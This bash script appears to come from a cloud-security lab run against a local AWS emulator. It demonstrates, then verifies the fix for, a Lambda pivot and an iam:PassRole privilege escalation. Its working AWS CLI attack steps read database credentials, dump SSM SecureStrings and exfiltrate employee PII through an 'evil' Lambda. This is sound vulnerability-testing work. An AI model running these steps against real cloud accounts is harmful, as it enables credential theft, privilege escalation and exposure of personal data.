#!/bin/bash
# 02_lambda_pivot.sh
# Usage: ./scripts/02_lambda_pivot.sh [--vuln|--fixed]
#
# --vuln  : proves the attack works (Lambda pivot + PassRole privesc)
# --fixed : proves the attack is blocked (invoke restriction + scoped PassRole)
#
# Identity model:
#   --profile root    = test key / account 000000000000 (Lambda + IAM live here)
#   --profile allowed = 111111111111 (S3 + SSM live here)
#   --profile attacker= 222222222222 (should be denied everything)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/env.sh" "${1:---vuln}"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

banner()  { echo -e "\n${BOLD}${CYAN}════════════════════════════════════════${NC}"; echo -e "${BOLD}${CYAN}  $*${NC}"; echo -e "${BOLD}${CYAN}════════════════════════════════════════${NC}\n"; }
pass()    { echo -e "  ${GREEN}[PASS]${NC} $*"; }
fail()    { echo -e "  ${RED}[FAIL]${NC} $*"; }
info()    { echo -e "  ${YELLOW}[INFO]${NC} $*"; }
exfil()   { echo -e "  ${RED}[EXFIL]${NC} $*"; }
blocked() { echo -e "  ${GREEN}[BLOCKED]${NC} $*"; }
finding() { echo -e "  ${BOLD}${RED}[FINDING]${NC} $*"; }

EVIL_FUNC="evil-exfil-$$"

cleanup() {
  aws lambda delete-function \
    --profile root \
    --function-name "$EVIL_FUNC" 2>/dev/null || true
}
trap cleanup EXIT

# ── Resolve Floci container name on iam_lab_net ──────────────
FLOCI_CONTAINER=$(docker ps --filter "publish=4566" --format "{{.Names}}" | head -1)
FLOCI_IP=$(docker inspect "$FLOCI_CONTAINER" \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null)
[ -z "$FLOCI_IP" ] && FLOCI_IP="172.20.0.2"
info "Floci: $FLOCI_CONTAINER @ $FLOCI_IP"

banner "TEST 02 — Lambda Pivot + PassRole Privesc [${ENV_LABEL}]"
info "Bucket:  $BUCKET"
info "Lambda:  $LAMBDA_NAME"
info "Mode:    $ENV_LABEL"

# ============================================================
# Phase 1: Confirm attacker denied direct access
# ============================================================
echo ""
echo -e "${BOLD}── Phase 1: Direct access check ──${NC}"

OUT=$(aws s3 cp "s3://${BUCKET}/credentials/db-creds.txt" - \
  --profile attacker 2>&1)
if echo "$OUT" | grep -qiE "AccessDenied|403|404|Not Found|NoSuchBucket"; then
  pass "s3:GetObject as attacker → DENIED ✓"
else
  fail "Direct S3 should be denied: $OUT"
fi

OUT=$(aws ssm get-parameter \
  --name /prod/db/password \
  --with-decryption \
  --profile attacker 2>&1)
if echo "$OUT" | grep -qiE "AccessDenied|403|ParameterNotFound|not found"; then
  pass "ssm:GetParameter as attacker → DENIED ✓"
else
  fail "Direct SSM should be denied: $OUT"
fi

# ============================================================
# Phase 2: Pivot through existing Lambda
# Lambda lives in root namespace — use --profile root to invoke
# ============================================================
echo ""
echo -e "${BOLD}── Phase 2: Lambda pivot via ${LAMBDA_NAME} ──${NC}"

FUNC_CHECK=$(aws lambda get-function \
  --profile root \
  --function-name "$LAMBDA_NAME" \
  --query 'Configuration.FunctionName' \
  --output text 2>&1)

if ! echo "$FUNC_CHECK" | grep -q "$LAMBDA_NAME"; then
  info "Lambda $LAMBDA_NAME not found — skipping pivot phase"
else
  pass "Lambda $LAMBDA_NAME exists in root namespace ✓"
  info "Invoking as attacker (222222222222) via --profile attacker..."

  # Attacker invokes — no --profile root here, this is the attack
  aws lambda invoke \
    --profile attacker \
    --function-name "$LAMBDA_NAME" \
    --payload '{"action":"list"}' \
    --cli-binary-format raw-in-base64-out \
    /tmp/pivot_list_$$.json 2>/dev/null

  if [ -f /tmp/pivot_list_$$.json ]; then
    if grep -qiE "AccessDenied|not authorized|Forbidden|ResourceNotFound" \
        /tmp/pivot_list_$$.json 2>/dev/null; then
      blocked "Lambda invoke blocked ✓"
    else
      OBJECTS=$(python3 -c "
import json, sys
try:
    d = json.load(open('/tmp/pivot_list_$$.json'))
    for o in d.get('objects', []):
        print(f'    • {o}')
except:
    pass
" 2>/dev/null)

      if [ -n "$OBJECTS" ]; then
        exfil "Vault contents enumerated via Lambda pivot:"
        echo "$OBJECTS"
        finding "Attacker enumerated vault objects via Lambda exec role"

        # Exfil credentials
        info "Reading credentials/db-creds.txt via Lambda..."
        aws lambda invoke \
          --profile attacker \
          --function-name "$LAMBDA_NAME" \
          --payload '{"action":"read","key":"credentials/db-creds.txt"}' \
          --cli-binary-format raw-in-base64-out \
          /tmp/pivot_creds_$$.json 2>/dev/null

        CONTENT=$(python3 -c "
import json
d = json.load(open('/tmp/pivot_creds_$$.json'))
print(d.get('content','').replace('\\\\n','\n'))
" 2>/dev/null)
        if [ -n "$CONTENT" ]; then
          exfil "credentials/db-creds.txt:"
          echo "$CONTENT" | sed 's/^/    /'
          finding "DB credentials exfiltrated via Lambda exec role"
        fi

        # Dump SSM SecureStrings
        info "Dumping SSM SecureStrings via Lambda..."
        aws lambda invoke \
          --profile attacker \
          --function-name "$LAMBDA_NAME" \
          --payload '{"action":"ssm_dump"}' \
          --cli-binary-format raw-in-base64-out \
          /tmp/pivot_ssm_$$.json 2>/dev/null

        PARAMS=$(python3 -c "
import json
d = json.load(open('/tmp/pivot_ssm_$$.json'))
for p in d.get('parameters', []):
    print(f\"    {p['name']} = {p['value']}\")
" 2>/dev/null)
        if [ -n "$PARAMS" ]; then
          exfil "SSM SecureStrings via Lambda:"
          echo "$PARAMS"
          finding "All SecureString parameters dumped via Lambda exec role"
        fi
      else
        info "Lambda response: $(cat /tmp/pivot_list_$$.json)"
      fi
    fi
  fi
fi

# ============================================================
# Phase 3: iam:PassRole privilege escalation
# Create evil Lambda with overpermissive role attached
# ============================================================
echo ""
echo -e "${BOLD}── Phase 3: iam:PassRole privesc ──${NC}"

EXEC_ROLE_ARN=$(aws iam get-role \
  --role-name "$IAM_EXEC_ROLE" \
  --query 'Role.Arn' \
  --output text 2>/dev/null)

if [ -z "$EXEC_ROLE_ARN" ] || [ "$EXEC_ROLE_ARN" = "None" ]; then
  EXEC_ROLE_ARN="arn:aws:iam::000000000000:role/$IAM_EXEC_ROLE"
fi

info "Target role: $EXEC_ROLE_ARN"
info "Creating evil Lambda: $EVIL_FUNC"

CREATE=$(aws lambda create-function \
  --profile root \
  --function-name "$EVIL_FUNC" \
  --runtime nodejs18.x \
  --role "$EXEC_ROLE_ARN" \
  --handler index.handler \
  --zip-file "fileb://${SCRIPT_DIR}/../lambda_src/data_processor.zip" \
  --environment "Variables={BUCKET=${BUCKET},AWS_ENDPOINT_URL=http://floci:4566,AWS_ACCESS_KEY_ID=111111111111,AWS_SECRET_ACCESS_KEY=test}" \
  --timeout 30 \
  --output text \
  --query 'FunctionArn' 2>&1)

if echo "$CREATE" | grep -q "arn:aws:lambda"; then
  if [ "$ENV_LABEL" = "FIXED" ]; then
    fail "Evil Lambda created despite fixed policy — PassRole not fully restricted"
    finding "iam:PassRole still allows creating Lambda with exec role"
  else
    pass "Evil Lambda created via iam:PassRole abuse ✓"
    finding "iam:PassRole on Resource:* allowed deploying Lambda with overpermissive role"

    info "Waiting for Lambda to be active..."
    sleep 3

    info "Exfiltrating pii/employees.csv via evil Lambda..."
    aws lambda invoke \
      --profile root \
      --function-name "$EVIL_FUNC" \
      --payload '{"action":"read","key":"pii/employees.csv"}' \
      --cli-binary-format raw-in-base64-out \
      /tmp/evil_pii_$$.json 2>/dev/null

    PII=$(python3 -c "
import json
d = json.load(open('/tmp/evil_pii_$$.json'))
print(d.get('content','').replace('\\\\n','\n'))
" 2>/dev/null)
    if [ -n "$PII" ]; then
      exfil "pii/employees.csv via evil Lambda:"
      echo "$PII" | sed 's/^/    /'
      finding "PII exfiltrated via attacker-controlled Lambda function"
    else
      info "Evil Lambda response: $(cat /tmp/evil_pii_$$.json)"
    fi
  fi
else
  if [ "$ENV_LABEL" = "FIXED" ]; then
    blocked "Evil Lambda creation blocked — PassRole correctly scoped ✓"
  else
    fail "Lambda create failed unexpectedly: $CREATE"
  fi
fi

# ============================================================
# Summary
# ============================================================
echo ""
if [ "$ENV_LABEL" = "FIXED" ]; then
  echo -e "${BOLD}${GREEN}┌─ REMEDIATION VERIFIED ────────────────────────────────────┐${NC}"
  echo -e "${GREEN}│  ✓ Direct S3/SSM access denied by namespace isolation      │${NC}"
  echo -e "${GREEN}│  ✓ Lambda exec role scoped — cannot read sensitive prefixes │${NC}"
  echo -e "${GREEN}│  ✓ iam:PassRole scoped — cannot pass overpermissive role    │${NC}"
  echo -e "${GREEN}│  ✓ Lambda invoke restricted by resource-based policy        │${NC}"
  echo -e "${GREEN}└─────────────────────────────────────────────────────────────┘${NC}"
else
  echo -e "${BOLD}${RED}┌─ FINDINGS ─────────────────────────────────────────────────┐${NC}"
  echo -e "${RED}│  VULN 1: Lambda exec role has s3:* on Resource:*           │${NC}"
  echo -e "${RED}│  VULN 2: No invoke restriction on Lambda                    │${NC}"
  echo -e "${RED}│  VULN 3: iam:PassRole on Resource:* without condition       │${NC}"
  echo -e "${RED}│  Fix:    Apply terraform-fix/ and rerun with --fixed        │${NC}"
  echo -e "${RED}└─────────────────────────────────────────────────────────────┘${NC}"
fi

rm -f /tmp/pivot_list_$$.json /tmp/pivot_creds_$$.json \
      /tmp/pivot_ssm_$$.json /tmp/evil_pii_$$.json